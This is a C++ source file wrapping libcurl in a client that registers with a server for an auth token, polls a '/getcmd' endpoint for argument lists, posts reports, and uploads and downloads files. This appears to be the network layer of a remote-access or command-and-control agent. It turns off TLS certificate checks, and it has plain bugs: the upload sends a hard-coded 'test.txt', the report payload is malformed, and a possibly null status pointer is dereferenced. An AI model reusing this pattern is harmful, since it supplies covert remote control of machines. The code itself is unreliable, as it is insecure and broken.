#include <stdio.h>
#include <curl/curl.h>
#include <iostream>
#include <fstream>

#include "rapidjson/document.h"
#include "rapidjson/writer.h"
#include "rapidjson/stringbuffer.h"


#include "requests.h"

using namespace std;

httpManager::httpManager(){
    curl_global_init(CURL_GLOBAL_DEFAULT);
}

httpManager::~httpManager(){
    curl_global_cleanup();
}

size_t httpManager::writeCallback(void *contents, size_t size, size_t nmemb, void *userp){
    ((string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

size_t httpManager::writeCallbackFile(void *contents, size_t size, size_t nmemb, void *userp){
    for(unsigned i=0;i<size * nmemb;i++){
        ((vector<char>*)userp)->push_back(((char*)contents)[i]);
    }
    return size * nmemb;
}

simpleCurl::simpleCurl(){
    curl= curl_easy_init();
    if (!curl){
        throw runtime_error( "Unable to init curl" );
    }
}
CURL *simpleCurl::getObject(){
    return curl;
}

string simpleCurl::simplePerform(const char * subpath,
            long *statusCode=nullptr,const char **headers=nullptr,FILE *fp=nullptr){
    
    string result;
    
    CURLcode res;
    struct curl_slist *headerList=NULL;

    //build header list
    if (headers!=nullptr){
        for(unsigned i=0;headers[i]!=NULL;i++){
            headerList = curl_slist_append(headerList, headers[i]);
        }
    }
    
    //set common options
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerList);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_URL, (SERVER_URL + subpath).c_str() );
    if (fp!=nullptr){
        curl_easy_setopt(curl, CURLOPT_WRITEDATA,fp);
    }
    else{
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, httpManager::writeCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &result);
    }

    //perform and check the request
    res = curl_easy_perform(curl);
    if (statusCode!=nullptr){
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, statusCode);
    }

    if(res != CURLE_OK){
        throw runtime_error( string("curl perform error: ")+curl_easy_strerror(res));
    }
    
    cout << "request sucessfully " << result << *statusCode << endl;
    
    
    

    //clean up
    curl_slist_free_all(headerList);
    return result;
}

simpleCurl::~simpleCurl(){
    curl_easy_reset(curl);
    curl_easy_cleanup(curl);
}


void httpManager::report(const char * report){
    const char *headers[]={jwtToken.c_str(),"Content-Type: application/json",nullptr};

    simpleCurl curl;
    long statusCode;
    


    char *result = curl_easy_escape(curl.getObject(), report , strlen(report));

    string jsonResponse("{\"response\":\"");
    jsonResponse+=report;
    jsonResponse+="\"   ,     \"statusCode\" : 0}";


    curl_easy_setopt(curl.getObject(),CURLOPT_POSTFIELDS, result );
    curl.simplePerform("/report",&statusCode,headers);
    
    
}

bool httpManager::makeRegister(){
    simpleCurl curl;
    string jsonresponse;
    long statusCode;
    rapidjson::Document d;


    jsonresponse = curl.simplePerform("/register",&statusCode);
    
    if (statusCode==200){
        d.Parse(jsonresponse.c_str());
        jwtToken=string("x-auth: ")+d["x-auth"].GetString();
        return true;
    }
    return false;
}

commandInput httpManager::getComand(){
    const char *headers[]={jwtToken.c_str(),nullptr};
    simpleCurl curl;
    commandInput result;
    long statusCode;
    string jsonresponse;
    rapidjson::Document d;
    
    cout << "geting command"<< endl;
    jsonresponse=curl.simplePerform("/getcmd",&statusCode,headers);
    cout << jsonresponse << endl;

    if (statusCode==200){
        d.Parse(jsonresponse.c_str());
        for(const auto& value : d["cmd"].GetArray()){
            result.argv.push_back(value.GetString());
        }
    }
    return result;
    
}



void httpManager::upload(const char * fname){
    const char *headers[]={jwtToken.c_str(),nullptr};
    long statusCode;
    simpleCurl curl;

    curl_mime *form = NULL;
    curl_mimepart *field = NULL;


    form = curl_mime_init(curl.getObject());
    /* Fill in the file upload field */ 
    field = curl_mime_addpart(form);

    curl_mime_name(field, "file");
    curl_mime_filedata(field, "test.txt");


    curl_easy_setopt(curl.getObject(), CURLOPT_MIMEPOST, form);
    curl.simplePerform("/upload",&statusCode,headers);

    curl_mime_free(form);
}

void httpManager::download(const char *fname){
    const char *headers[]={jwtToken.c_str(),nullptr};
    long statusCode;
    simpleCurl curl;
    vector<char>fresult;
    FILE *dst;
    if(!(dst=fopen(fname,"wb"))){
        perror("unable to open file");
    }
    
    string response=curl.simplePerform("/download",&statusCode,headers,dst);


    fclose(dst);

}


